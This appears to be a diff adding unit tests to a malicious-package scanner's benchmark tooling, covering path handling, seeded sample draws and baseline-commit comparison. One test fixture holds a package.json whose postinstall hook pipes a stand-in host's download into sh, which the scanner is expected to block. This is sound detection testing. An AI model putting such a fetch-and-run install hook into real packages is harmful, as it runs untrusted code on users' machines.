@@ -5,6 +5,7 @@ from __future__ import annotations
 import base64
 import hashlib
 import io
+import os
 import sys
 import tarfile
 import unittest
@@ -79,16 +80,69 @@ class DigestTests(unittest.TestCase):
         self.assertFalse(independent._digest_ok({}, data))
 
 
+class PathTests(unittest.TestCase):
+    def test_recorded_paths_use_forward_slashes_from_the_root(self):
+        target = independent.ROOT / "bench" / "fixtures" / "independent-sample-round2.json"
+        self.assertEqual(independent._rel(target), "bench/fixtures/independent-sample-round2.json")
+        relative = Path(os.path.relpath(target))  # as typed on the command line, from any folder
+        self.assertEqual(independent._rel(relative), "bench/fixtures/independent-sample-round2.json")
+
+
 class DrawTests(unittest.TestCase):
     def test_the_draw_is_fixed_by_the_seed(self):
         frame = {s: {f"p{i}": [{"path": f"samples/{s}/p{i}/{v}/x.zip", "bytes": 1, "git_blob": "0"} for v in (1, 2)]
                      for i in range(1, 700)} for s in independent.MALICIOUS}
-        first, second = independent.draw_malicious(frame), independent.draw_malicious(frame)
+        (first, _), (second, _) = independent.draw_malicious(frame), independent.draw_malicious(frame)
         self.assertEqual(first, second)
         per_set = {s: sum(r["set"] == s for r in first) for s in independent.MALICIOUS}
         for s, k in independent.MALICIOUS.items():
             self.assertEqual(per_set[s], k if k is not None else 699)
         self.assertEqual(first[0]["version"], first[0]["path"].split("/")[4])
+
+    def test_a_second_round_draws_new_packages_and_halves_the_whole_sets(self):
+        frame = {s: {f"p{i}": [{"path": f"samples/{s}/p{i}/1/x.zip", "bytes": 1, "git_blob": "0"}]
+                     for i in range(1, 700)} for s in independent.MALICIOUS}
+        first, _ = independent.draw_malicious(frame)
+        used: dict[str, set[str]] = {}
+        for row in first:
+            used.setdefault(row["set"], set()).add(row["package"])
+        second, tune = independent.draw_malicious(frame, "round 2", used, split=True, commit="abc")
+        for row in second:
+            if independent.MALICIOUS[row["set"]] is not None:
+                self.assertNotIn(row["package"], used[row["set"]])  # never drawn before
+            else:
+                self.assertNotIn(row["package"], tune[row["set"]])  # measured only on the half not tuned on
+            self.assertEqual(row["commit"], "abc")
+        for stratum, names in tune.items():
+            tested = {r["package"] for r in second if r["set"] == stratum}
+            self.assertEqual(len(names) + len(tested), 699)
+            self.assertFalse(set(names) & tested)
+
+
+class BaselineTests(unittest.TestCase):
+    def test_an_earlier_commit_judges_beside_the_current_code(self):
+        import shutil
+        import subprocess
+        import tempfile
+
+        if subprocess.run(["git", "-C", str(ROOT), "rev-parse", "HEAD"], capture_output=True).returncode:
+            self.skipTest("not a git checkout")
+        tmp = tempfile.mkdtemp(prefix="pah-baseline-test-")
+        self.addCleanup(shutil.rmtree, tmp, True)
+        self.addCleanup(setattr, independent, "BASELINE_SCAN", None)
+        sha = independent.baseline_package("HEAD", Path(tmp))
+        self.assertRegex(sha, r"^[0-9a-f]{40}$")
+        self.assertTrue((Path(tmp) / "pah_baseline" / "scan.py").is_file())
+        self.assertTrue((Path(tmp) / "pah_baseline" / "data" / "popular-npm.txt").is_file())
+        independent._use_baseline(tmp)
+        import pah_baseline.scan  # noqa: F401  (a package of its own, not the current pah)
+        self.assertNotEqual(Path(sys.modules["pah_baseline.scan"].__file__).parent, ROOT / "pah")
+        beacon = {"package.json": b'{"name": "d", "version": "1.0.0", "scripts": {"postinstall": '
+                                  b'"curl -s https://drop.example.invalid/x | sh"}}'}
+        out = independent.judge(beacon)
+        self.assertEqual(out["verdict_baseline"], "block")
+        self.assertEqual(out["verdict"], "block")
+        self.assertIn("PAH-P001", out["rules_baseline"])
 
 
 if __name__ == "__main__":
